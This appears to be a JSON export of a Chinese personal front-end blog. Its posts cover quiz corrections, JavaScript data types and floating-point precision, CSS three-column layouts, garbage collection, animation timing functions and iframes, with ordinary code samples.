1.div:first-child要满足的条件，首先必须得是div元素，还得是第一个子元素，如果不满足 就不会被选中 2.div:first-of-type要满足的条件，首先必须得是div元素，还得是第一个出现的div元素，如果不满足 就不会被选中 3.nth-childa:nth-child(5)： 必须是a元素 必须是第五个子元素 4.nth-of-type：a:nth-of-type:选中所有a元素中的第n个a元素 第三题 ele.clientWidth = 宽度 + padding ele.offsetWidth = 宽度 + padding + border ele.scrollTop = 被卷去的上侧距离 ele.scrollHeight = 自身实际的高度（不包括边框） 第四题 标签为诸如 video 元素之类的媒介规定外部文本轨道。用于规定字幕文件或其他包含文本的文件，当媒介播放时，这些文件是可见的。 第五题 注意#会跳转到页面顶部，所以这题不选a 第六题 其中 font 标签，存在反语义（ font 解释为文字，但 ”文字“ 意思太泛了，而是应根据使用环境选择其他标签。如标题 ~ 等标签）在 HTML 4.01 中，不被赞成使用； 第七题 不是所有标签都需要结束标签，例如-；doctype类型会影响；HTML标签对大小写不敏感，为了规范，推荐小写。 第八题 multiple用于select的多选或者上传多个文件 Markdown 2659 字数 62 行数 当前行 57, 当前列 5 文章已保存21:48:08HTML 667 字数 30 段落已成功保存至草稿箱","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"面经笔经","slug":"技术/前端/面经笔经","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/%E9%9D%A2%E7%BB%8F%E7%AC%94%E7%BB%8F/"}],"tags":[]},{"title":"笔试题错题集——JS篇","slug":"笔试题错题集——JS篇","date":"2020-03-13T16:00:00.000Z","updated":"2024-05-25T04:21:29.274Z","comments":true,"path":"2020/03/14/笔试题错题集——JS篇/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/14/%E7%AC%94%E8%AF%95%E9%A2%98%E9%94%99%E9%A2%98%E9%9B%86%E2%80%94%E2%80%94JS%E7%AF%87/","excerpt":"第一题","text":"第一题 Reg对象的exec方法返回的是一个数组，正常情况下在控制台会打印出完整的信息但是如果使用document.write的话输出的是数组的第一项： 第二题字符串的模式匹配方法有这几个，他们的参数均只能是字符串或正则表达式，不能是其他值： match()——类似于正则表达式的exec，对字符串进行匹配，返回数组 search()——返回字符串中第一个匹配项的索引值 replace()——提供两个参数，如果第一个参数是字符串，那么只会替换第一个,如果要替换全部，只能只用正则表达式再来回顾一下replace第二个参数是函数： split()——指定分隔符将字符串分割为多个子字符串 第三题b的prototype=new A构造函数的x没有赋值，并不是自动去原型下找，如果构造函数没有x才会去原型下找，A构造函数里面有this.x = x，所以构造函数有x，不会去原型链上找。如果有x但是没有赋值，则是undefined,相当于x=undefined.就不会进入原型链了 第四题这个题中，!会将操作数转换为Boolean，==转换为数值[]本身转换为Boolean就等于true，但是如果使用==进行比较，那么[]会被转换成为0，相当于又变成了false 第五题严格模式下严禁this指向全局对象 第六题变量提升的优先级：变量声明(foo#1) &lt; 函数声明(foo#2) &lt; 变量赋值(foo#3) 第七题Math.round()并不总是舍入到远离0的方向（尤其是在负数的小数部分恰好等于0.5的情况下） 第八题 svg绘制出来的每一个图形的元素都是独立的DOM节点，能够方便的绑定事件或用来修改。 canvas输出的是一整幅画布，svg输出的图形是矢量图形，后期可以修改参数来自由放大缩小，不会失真和锯齿。而canvas输出标量画布，就像一张图片一样，放大会失真或者锯齿。 SVG功能更完善，适合静态图片展示 第九题","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"面经笔经","slug":"技术/前端/面经笔经","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/%E9%9D%A2%E7%BB%8F%E7%AC%94%E7%BB%8F/"}],"tags":[]},{"title":"关于JS基本数据类型","slug":"关于JS基本数据类型","date":"2020-03-10T16:00:00.000Z","updated":"2024-05-25T04:21:29.712Z","comments":true,"path":"2020/03/11/关于JS基本数据类型/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/11/%E5%85%B3%E4%BA%8EJS%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","excerpt":"基本数据类型","text":"基本数据类型 undefined：已声明对象但未进行初始化 null：空对象的引用 boolean： true、false number string 转换为true 转换为false Boolean true false string 空串 非空串 number 非零 0或NaN obj 任何对象 null undefine （不可用） undefine JS的堆栈存储堆是堆内存的简称，栈是栈内存的简称。 堆是动态分配内存，内存大小不一，也不会自动释放。栈是自动分配相对固定大小的内存空间，并由系统自动释放. JS的数据类型 基本数据类型Undefined、Null、Boolean、String、Number、Symbol都是直接按值直接存在栈中，每种类型的数据占用的内存空间大小都是固定的，并且由系统自动分配自动释放 引用数据类型Object，Array，Function这样的数据存在堆内存中，但是数据指针是存放在栈内存中的，当我们访问引用数据时，先从栈内存中获取指针，通过指针在堆内存中找到数据 上面加粗部分字体很关键！！！容易被坑 .答： 三个变量均存储在栈中 执行完后a.i的值依然是op 再来看下面的代码： 123let arr_origin = [1,2,3,4,5];let arr_copy = arr_origin;let arr2 = arr_origin[2]; 如果执行下面代码： 12arr_copy[1] = 'change1'；arr2 = ‘change2’ 我们发现arr_origin中的下标是1的值变成change1，但是下标是2的值并未变化。原因是：arr_copy是arr_origin栈指针的引用，并未开辟新的内存空间，但是arr2是在栈内存中独立存在，所以会产生上述结果。熟悉此原理，则数据的深浅拷贝就不难理解了！ number类型 十进制：直接输入 八进制（严格模式无效）：以0开头070——56079——无效，解析为79 十六进制：0x开头0xA——10 浮点数值 123var a = .1 //解析为0.1，不推荐var b = 1. //解析为1var c = 1.0 //解析为1 应该尽量避免使用浮点数计算测试0.1 + 0.2 != 0.3 原因：因为 JS 采用 IEEE 754双精度版本（64位），并且只要采用 IEEE 754的语言都有该问题 我们都知道计算机是通过二进制来存储东西的，那么 0.1 在二进制中会表示为 12// (0011) 表示循环0.1 = 2^-4 * 1.10011(0011) 我们可以发现，0.1 在二进制中是无限循环的一些数字，其实不只是 0.1，其实很多十进制小数用二进制表示都是无限循环的。这样其实没什么问题，但是 JS采用的浮点数标准却会裁剪掉我们的数字。 IEEE 754 双精度版本（64位）将 64 位分为了三段 第一位用来表示符号接下去的 11 位用来表示指数其他的位数用来表示有效位，也就是用二进制表示 0.1 中的 10011(0011) 那么这些循环的数字被裁剪了，就会出现精度丢失的问题，也就造成了 0.1 不再是 0.1 了，而是变成了 0.100000000000000002 10.100000000000000002 === 0.1 // true 那么同样的，0.2 在二进制也是无限循环的，被裁剪后也失去了精度变成了 0.200000000000000002 10.200000000000000002 === 0.2 // true 所以这两者相加不等于 0.3 而是 0.300000000000000004 10.1 + 0.2 === 0.30000000000000004 // true 那么可能你又会有一个疑问，既然 0.1 不是 0.1，那为什么 console.log(0.1) 却是正确的呢？ 因为在输入内容的时候，二进制被转换为了十进制，十进制又被转换为了字符串，在这个转换的过程中发生了取近似值的过程，所以打印出来的其实是一个近似值，你也可以通过以下代码来验证 1console.log(0.100000000000000002) // 0.1 解决方案： 1parseFloat((0.1 + 0.2).toFixed(10)) === 0.3 // true 数值范围 最小数值：Number.MIN_VALUE 最大数值：Number.MAX_VALUE 无穷大：Infinity确定一个数是不是有穷的：isFinity() NaN 含义：非数值 关注点：所有涉及NaN的操作，都会返回NaN 在使用 == 或 === 时，NaN不等于自身，但是使用Object.is(NaN,NaN)结果是true isNaN()函数：参数接收任何类型，并尝试转换为数值，若无法转换，则返回true。若参数是一个对象，则先调用参数的valueOf，再调用toString例子： 12345isNaN(NaN) //true10 //false'10' //false'blue' //truetrue //false Number() Boolean：返回1或0 null：0 Number：直接返回 undefine：NaN String：只包含数字：忽略前导零后返回空串：0有效的十六进制：“Oxf”~15其他：NaN Object：调用valueOf，若返回NaN，则调用toString parseInt规则：从第一非空格字符开始，如果第一个字符不是数字或符号，则返回NaN，否则解析知道第一个非数值字符 123456'123bule' //123'' //NaN'0xA' //10'22.9' //22'070' //56'70' //70 注意：对于‘070’这种，ES3规范解析为八进制，ES5解析为十进制 parseFloat规则与上述相同注意：这个方法只解析十进制，不解析十六进制，对于十六进制串，直接返回0 Stringstring是JS的一个基本数据类型，但是，它同时也是JS的一个包装类型 string有两种表现形式：字符串字面值和 String 对象 大多数人都知道string可以这样使用： 12var a = '123'console.log(a.length) //3 于是很多人认为string是对象。这是错误的。 string作为JS基本数据类型之一，它不是Object类型这是绝对而且肯定的，只不过我们需要区分‘123’和var a = new String(&#39;123&#39;)的区别： ‘123’是基本数据类型string a是对象 前者是字面量方式，后者是对象方式 之所以我们使用字面量方式定义的字符串也可以使用一些字符对象方法，是因为JS在执行过程中自动进行了装箱操作：内部将 ‘123’ 包装成了一个 String 对象，执行完后，再把这个对象丢弃了 toString除了null和undefined，其他类型都具有这个方法 string()传入一个非串值，返回字符串，内部通过调用参数的toString方法。如果是null或者undefined， 则返回&#39;null‘和&#39;undefined&#39; 注意这个函数和上面那个方法的区分","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"圣杯布局与双飞翼布局","slug":"圣杯布局与双飞翼布局","date":"2020-03-09T16:00:00.000Z","updated":"2024-05-25T04:21:29.360Z","comments":true,"path":"2020/03/10/圣杯布局与双飞翼布局/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/10/%E5%9C%A3%E6%9D%AF%E5%B8%83%E5%B1%80%E4%B8%8E%E5%8F%8C%E9%A3%9E%E7%BF%BC%E5%B8%83%E5%B1%80/","excerpt":"简介","text":"简介 圣杯布局和双飞翼布局是前端工程师需要日常掌握的重要布局方式。两者的功能相同，都是为了实现一个两侧宽度固定，中间宽度自适应的三栏布局。虽然说css3提供了flex布局之后，实现两侧固定，中间自适应已经变得很简单，但是对于传统的方法，依然很有必要了解一下 对于这两种实现的方式，都有用以下共同点： 两侧宽度固定，中间宽度自适应 中间部分在DOM结构上优先，以便先行渲染 允许三列中的任意一列成为最高列 只需要使用一个额外的标签 上述第二点是flex布局所没有的优势 圣杯布局DOM结构12345&lt;div class=\"container\"&gt; &lt;div class=\"main\"&gt;&lt;/div&gt; &lt;div class=\"left\"&gt;&lt;/div&gt; &lt;div class=\"right\"&gt;&lt;/div&gt;&lt;/div&gt; css布局代码12345678910111213141516171819202122232425262728.container &#123; padding-left: 120px; padding-right: 220px;&#125;.main &#123; float: left; width: 100%; height:300px; background: green;&#125;.left &#123; position: relative; left: -120px; float: left; height: 300px; width: 100px; margin-left: -100%; background: red;&#125;.right &#123; position: relative; right: -220px; float: right; height: 300px; width: 200px; margin-left: -200px; background: blue;&#125; 在上述代码中，由于padding的影响，我们单纯使用margin-left出来的效果是这样的那是因为相对定位的包含块是父级元素的content-box，所以就算将元素移动上来，也会受到padding的影响而覆盖了部分main元素。但是我们可以使用包含块为padding-box的计算方式（绝对定位），使用left和right调整之后： 双飞翼布局DOM结构： 12345&lt;div class=\"content\"&gt; &lt;div class=\"main\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=\"left\"&gt;&lt;/div&gt;&lt;div class=\"right\"&gt;&lt;/div&gt; CSS: 1234567891011121314151617181920212223242526272829303132.content &#123; float: left; width: 100%;&#125;.main &#123; height: 200px; margin-left: 110px; margin-right: 220px; background: green;&#125;.main::after &#123; content: ''; display: block; font-size:0; height: 0; zoom: 1; clear: both;&#125;.left &#123; float:left; height: 200px; width: 100px; margin-left: -100%; background: red;&#125;.right &#123; float: right; height: 200px; width: 200px; margin-left: -200px; background: blue;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"CSS","slug":"技术/前端/CSS","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/CSS/"}],"tags":[]},{"title":"JS垃圾回收机制","slug":"JS垃圾回收机制","date":"2020-03-08T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/03/09/JS垃圾回收机制/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/09/JS%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/","excerpt":"序言一般的浏览器都具有Javascript垃圾回收机制（GC：Garbage Collection），也就是说执行环境会负责管理代码执行过程中使用的内存，这个过程是不可见的，我们创建的基本类型，函数，对象，数组等等，都需要内存，同时也都需要回收 当不再需要某样东西时，javascript引擎就会发现并清理它，具体是怎么实现的呢？","text":"序言一般的浏览器都具有Javascript垃圾回收机制（GC：Garbage Collection），也就是说执行环境会负责管理代码执行过程中使用的内存，这个过程是不可见的，我们创建的基本类型，函数，对象，数组等等，都需要内存，同时也都需要回收 当不再需要某样东西时，javascript引擎就会发现并清理它，具体是怎么实现的呢？ 可达性JS管理内存有一个主要概念就是可达性。简单来说，可达性就是可以以某种方法访问或引用的值，他们被保证存储在内存中。 根——固定的可达值，永远不会被回收 本地函数的局部变量与参数 当前调用函数的作用域链上的变量与参数 全局变量 如果引用或引用链可以从根访问到其他任何值，则认为该值是可以访问的例如，如果局部变量中有对象，并且该对象具有引用另一个对象的属性，则该对象被视为可达性， 它引用的那些也是可以访问的 一个例子123let user = &#123; name:'tom'&#125; 需要注意的是，这里需要转变一下观念，代码里的user和 {name:“John”}，实际上是两个对象，而这里的箭头，指的就是user引用了对象 {name:“John”}。 这个时候如果user的值被覆盖，引用丢失： 1user = null 那么很显然， {name:“John”}将没有任何办法能够引用和访问到它，垃圾回收将丢弃这个对象并释放内存 两个引用而对于下面这个例子 12345let user = &#123; name:'tom'&#125;let admin = useruser = null 最终该对象是可以通过admin全局变量访问的，所以即使user被覆盖，也依然可以通过admin访问，对象可达，所以不会被回收 相互关联123456789101112131415function marry (man, woman) &#123; woman.husban = man; man.wife = woman; return &#123; father: man, mother: woman &#125;&#125;let family = marry(&#123; name: \"John\"&#125;, &#123; name: \"Ann\"&#125;) 函数 marry 通过给两个对象彼此提供引用来“联姻”它们，并返回一个包含两个对象的新对象，这个时候他们的内存结构是这样的：到目前为止所有对象都是可以访问的 这个时候删除两个引用： 12family.father = nullfamily.mother.husband = null 这个时候我们发现，已经没有任何方法途径可以访问和引用左下角的这个对象了： 垃圾回收后： 无法访问的数据块有可能整个相互连接的对象变得不可访问并从内存中删除。例如上面的例子： 1family = null 这个时候内存的结构变成了：由于family对象已经从根上断开了连接，所以marry函数内部的变量，参数都会被删除 垃圾回收算法一般来说没有被引用的对象就是垃圾，就是要被清除， 有个例外如果几个对象引用形成一个环，互相引用，但根访问不到它们，这几个对象也是垃圾，也要被清除。 标记清除这是一个最常用的回收算法，定期执行以下垃圾回收步骤： 垃圾回收器获取根并“标记”他们 然后访问并“标记”所有他们的引用 然后它访问标记的对象并标记它们的引用。所有被访问的对象都被记住，以便以后不再访问同一个对象两次。 以此类推，直到有未访问的引用(可以从根访问)为止。 除标记的对象外，所有对象都被删除。 举个例子，现有一个对象结构如下： 第一步：标记根第二步：标记他们的引用第三步：以此类推，标记子孙代的引用：第四步：没有被标记的对象被清除 引用计数引用计数的含义是跟踪记录每个值被引用的次数。 当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是 1。如果同一个值又被赋给另一个变量，则该值的引用次数加 1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减 1。当这个值的引用次数变成 0 时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。 这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为 0 的值所占用的内存。 123456function test() &#123; var a = &#123;&#125;; // &#123;&#125;的引用次数为1 var b = a; // &#123;&#125;的引用次数加1，为2 var c = a; // &#123;&#125;的引用次数再加1，为3 var b = &#123;&#125;; // &#123;&#125;的引用次数减1，为2&#125; 其实读者在看完上面这段描述，再结合标记清除，很快就会发现，引用计数对于那种相互引用产生的数据块会产生严重的问题：他们的引用数量永远不会是0 123456function fn() &#123; var a = &#123;&#125;; var b = &#123;&#125;; a.pro = b; b.pro = a;&#125; 正如上面这个例子所说，他们之间的内存结构如下： 当函数执行完毕或者说直接就没有执行时：a与b的引用次数都不为0，但是他们整体的代码块是不可达的，所以可以使用标记清除来回收他们的内存，可是引用计数就束手无策了。 如果使用引用计数，当fn函数被大量调用，可以想象，其内存占用将直线上升 虽然在如今的浏览器中基本都是使用标记清除，但是！！！IE这个奇葩又来了…….. IE 中有一部分对象并不是原生 JS 对象。例如，其内存泄露 DOM 和 BOM 中的对象就是使用 C++ 以 COM 对象的形式实现的，而 COM 对象的垃圾回收机制采用的就是引用计数策略。因此，即使IE的js引擎采用标记清除策略来实现，但 JS 访问的COM对象依然是基于引用计数策略的。换句话说，只要在 IE 中涉及 COM 对象，就会存在循环引用的问题。 1234var element = document.getElementById(\"some_element\");var myObject = new Object();myObject.e = element;element.o = myObject; 这个例子在一个 DOM 元素 element 与一个原生js对象 myObject 之间创建了循环引用。其中，变量 myObject 有一个属性 e 指向 element 对象；而变量 element 也有一个属性 o 回指 myObject。由于存在这个循环引用，即使例子中的 DOM 从页面中移除，它也永远不会被回收。 两个实际性的例子：第一个： 黄色是指直接被 js变量所引用，在内存里 红色是指由于DOM树的连接关系，间接被 js变量所引用，如上图，refB 被 refA 间接引用，导致即使 refB 变量被清空，也是不会被回收的 子元素 refB 由于 parentNode指针 的间接引用，只要它不被删除，它所有的父元素（图中红色部分）都不会被删除 换句话说：要将上面有颜色的块删除，必须同时删除refA和refB，否则都不行 第二个（这个例子简直——绝了，我都惊呆了） 1234window.onload=function outerFunction()&#123; var obj = document.getElementById(\"element\"); obj.onclick=function innerFunction()&#123;&#125;;&#125;; 这段代码看起来没什么问题，但是 obj 引用了 document.getElementById(‘element’)，而 document.getElementById(‘element’) 的 onclick 方法会引用外部环境中的变量（outerFunction），自然也包括 obj，obj又引用了document.getElementById(‘element’) 。是不是很隐蔽啊。(在比较新的浏览器中在移除Node的时候已经会移除其上的event了，但是在老的浏览器，特别是 IE 上会有这个 bug) 解决办法： 最简单的方式就是自己手工解除循环引用，比如刚才的函数可以这样 12345window.onload=function outerFunction()&#123; var obj = document.getElementById(\"element\"); obj.onclick=function innerFunction()&#123;&#125;; obj=null;&#125;; 终于：IE9+ 并不存在循环引用导致 DOM 内存泄露问题，可能是微软做了优化，或者 DOM 的回收方式已经改变。 垃圾回收的触发时机：垃圾回收器周期性运行，如果分配的内存非常多，那么回收工作也会很艰巨，确定垃圾回收时间间隔就变成了一个值得思考的问题。IE6的垃圾回收是根据内存分配量运行的，当环境中存在256个变量、4096个对象、64k的字符串任意一种情况的时候就会触发垃圾回收器工作，看起来很科学，不用按一段时间就调用一次，有时候会没必要，这样按需调用不是很好吗？但是如果环境中就是有这么多变量等一直存在，现在脚本如此复杂，很正常，那么结果就是垃圾回收器一直在工作，这样浏览器就没法儿玩儿了。 微软在 IE7 中做了调整，触发条件不再是固定的，而是动态修改的，初始值和 IE6 相同，如果垃圾回收器回收的内存分配量低于程序占用内存的15%，说明大部分内存不可被回收，设的垃圾回收触发条件过于敏感，这时候把临街条件翻倍，如果回收的内存高于 85%，说明大部分内存早就该清理了，这时候把触发条件置回。这样就使垃圾回收工作智能了很多 GC优化策略分代回收这个和Java回收策略思想是一致的，也是V8所主要采用的。目的是通过区分“临时”与“持久”对象；多回收“临时对象”区（young generation），少回收“持久对象”区（tenured generation），减少每次需遍历的对象，从而减少每次GC的耗时。如图：一些优化： 增量回收这个方案的思想很简单，就是“每次处理一点，下次再处理一点，如此类推”。如图： 空闲时间收集垃圾回收器只在 CPU 空闲时运行，以减少对执行的可能影响。 内存溢出带来的影响JS 程序的内存溢出后，会使某一段函数体永远失效（取决于当时的 JS 代码运行到哪一个函数），通常表现为程序突然卡死或程序出现异常。 可能的泄露点 DOM/BOM 对象泄漏； script 中存在对 DOM/BOM 对象的引用导致； JS 对象泄漏； 通常由闭包导致 事件处理回调，导致 DOM 对象和脚本中对象双向引用，这个是常见的泄漏原因； 代码关注点 DOM 中的 addEventLisner 函数及派生的事件监听 其它 BOM 对象的事件监听， 比如 websocket 实例的 on 函数; 避免不必要的函数引用； 如果使用 render 函数，避免在 HTML 标签中绑定 DOM/BOM 事件;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"animation-timing-function","slug":"animation-timing-function","date":"2020-03-08T16:00:00.000Z","updated":"2024-05-25T04:21:30.308Z","comments":true,"path":"2020/03/09/animation-timing-function/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/09/animation-timing-function/","excerpt":"css中animation属性animation-timing-function知识点以及属性值steps()详解在animation中最重要的其实就是时间函数（animation-timing-function）这个属性，他决定了你的动画将以什么样的速度执行，所以最关键的属性值也就是cubic-bezier(n,n,n,n),你平时用到的linear、ease、ease-out等都是基于这个属性值的，那么我们接下来就看看这个东西到底是什么含义。 这个时间函数是通过一个坐标反映出来的：这个就是timing-function的工作图，总共有4个点来描述整个曲线的运动形状","text":"css中animation属性animation-timing-function知识点以及属性值steps()详解在animation中最重要的其实就是时间函数（animation-timing-function）这个属性，他决定了你的动画将以什么样的速度执行，所以最关键的属性值也就是cubic-bezier(n,n,n,n),你平时用到的linear、ease、ease-out等都是基于这个属性值的，那么我们接下来就看看这个东西到底是什么含义。 这个时间函数是通过一个坐标反映出来的：这个就是timing-function的工作图，总共有4个点来描述整个曲线的运动形状其中P0和P3是开始和截止的位置，关键位置是P1和P2，那么P1的坐标(x,y)就对应了cubic-bezier(n,n,n,n)的前两个n的值，而P2的坐标对应了后两个n的值，那么整个图中就有4个点了（P0、P3永远是固定的）。 接下来就是关键步骤了，将P0、P1连线、P2、P3连线，此时这两条线就是整条曲线首位的切线，然后发挥自己的想象力想一下，这两个切线固定，那么整条曲线基本就可以画出来了 画完了，这就是一条运动曲线，那么怎么确定动画的速度呢，其实这条曲线的平陡程度就是动画快慢的反应，即越陡的部分动画反应出来就是越快，越平的部分当然动画反应的就是越慢了。 普通动画介绍那么基于这两个重要的坐标，css指定了几条常用的曲线： linear ： {-webkit-animation-timing-function:cubic-bezier(0,0,1,1);} （0,0,1,1） ease ： {-webkit-animation-timing-function:cubic-bezier(0.25,0.1,0.25,1);} （0.25,0.1,0.25,1） ease-in ： {-webkit-animation-timing-function:cubic-bezier(0.42,0,1,1);} （0.42,0,1,1） ease-out ： {-webkit-animation-timing-function:cubic-bezier(0,0,0.58,1);} （0,0,0.58,1） ease-in-out： {-webkit-animation-timing-function:cubic-bezier(0.42,0,0.58,1);} （0.42,0,0.58,1） 后面的就是他们的坐标，你可以将cubic-bezier(n,n,n,n)设置成对应值进行动画比较，是一样的，这是你就发现其实第一个linear可以换成坐标（0.5,0.5,0.5,0.5），总之很多值都可以替换。 复习一下animation动画的属性吧：","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"CSS","slug":"技术/前端/CSS","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/CSS/"}],"tags":[]},{"title":"关于iframe","slug":"关于iframe","date":"2020-03-08T16:00:00.000Z","updated":"2024-05-25T02:28:45.262Z","comments":true,"path":"2020/03/09/关于iframe/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/09/%E5%85%B3%E4%BA%8Eiframe/","excerpt":"iframe的作用","text":"iframe的作用 iframe 元素会创建包含另外一个文档的内联框架（即行内框架），简单来说就是把另一个文档用iframe给引进来 例如A页面引入B页面里面的内容 A页面： 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;style&gt; iframe &#123; width: 300px; height: 300px; background-color: red; border: 0; &#125; html * &#123; margin: 0; padding: 0; &#125;&lt;/style&gt;&lt;body&gt; &lt;iframe src=\"./iframe_B.html\" frameborder=\"0\" scrolling=\"no\"&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt; B页面： 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;style&gt; .box &#123; width: 300px; height: 300px; border: 1px solid black; &#125;&lt;/style&gt;&lt;body&gt; &lt;div class=\"box\"&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; iframe的一些基本属性 frameborder:是否显示边框，0(不显示) height:框架作为一个普通元素的高度，建议在使用css设置。 width:框架作为一个普通元素的宽度，建议使用css设置。 name:框架的名称，window.frames[name]时专用的属性。 scrolling:框架的是否滚动。yes,no,auto。 src：内框架的地址，可以使页面地址，也可以是图片的地址。 srcdoc , 用来替代原来HTML body里面的内容。但是IE不支持, 不过也没什么卵用 sandbox: 对iframe进行一些列限制，IE10+支持 iframe的优点 iframe能够原封不动的把嵌入的网页展现出来。 如果有多个网页引用iframe，那么你只需要修改iframe的内容，就可以实现调用的每一个页面内容的更改，方便快捷。 网页如果为了统一风格，头部和版本都是一样的，就可以写成一个页面，用iframe来嵌套，可以增加代码的可重用。 如果遇到加载缓慢的第三方内容如图标和广告，这些问题可以由iframe来解决。 可以使用iframe配合window.name和postMessage、document.domain进行跨域 iframe的缺点 iframe会阻塞主页面的onload事件； iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载。 iframe框架结构有时会让人感到迷惑，如果框架个数多的话，可能会出现上下、左右滚动条，会分散访问者的注意力，用户体验度差。 代码复杂，无法被一些搜索引擎索引到，这一点很关键，现在的搜索引擎爬虫还不能很好的处理iframe中的内容，所以使用iframe会不利于搜索引擎优化（SEO）。 很多的移动设备无法完全显示框架，设备兼容性差。 iframe框架页面会增加服务器的http请求，对于大型网站是不可取的。 关于iframe的一个问题：有一个问题是这样问的：怎么判断一个对象a是数组一般人应该都会想到这几个方法： a instanceof Array Object.prototype.toString.call(‘a’) === ‘[Object Array]’ Arrar.isArray() a.constructor === Array; 但是今天在做题的时候遇到了一个坑：问你的是判断一个对象最准确的方法，按理说上面的方法都应该可以，果断全选，然后错了（害） instanceof是不准确的 原因就是： 在浏览器中，我们的脚本可能需要在多个窗口之间进行交互，多个窗口意味着多个全局环境，不同的全局环境拥有不同的全局对象，从而拥有不同的内置类型构造函数。 在这个表达式中[] instanceof window.frames[0].Array会返回false 就是因为： instanceof 操作符的问题在于，它假定只有一个全局执行环境。如果网页中包含多个【frame】框架，那实际上就存在两个以上不同的全局执行环境，从而存在两个以上不同版本的 Array 构造函数。如果你从一个框架向另一个框架传入一个数组，那么传入的数组与在第二个框架中原生创建的数组分别具有各自不同的构造函数，在第二个框架中对传入的数组使用instanceof 操作符就会出现问题 所以ES5中新增的Array.isArray()方法，就是为了解决这个问题 现在基本上都是用Ajax来代替iframe，所以iframe已经渐渐的退出了前端开发。如果需要使用iframe，最好是通过javascript动态给iframe添加src属性值，这样可以绕开以上一些问题。","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"HTML、浏览器综合","slug":"技术/前端/HTML、浏览器综合","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/HTML%E3%80%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BB%BC%E5%90%88/"}],"tags":[]},{"title":"置换元素和非置换元素","slug":"置换元素和非置换元素","date":"2020-03-08T16:00:00.000Z","updated":"2024-05-25T02:28:45.282Z","comments":true,"path":"2020/03/09/置换元素和非置换元素/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/09/%E7%BD%AE%E6%8D%A2%E5%85%83%E7%B4%A0%E5%92%8C%E9%9D%9E%E7%BD%AE%E6%8D%A2%E5%8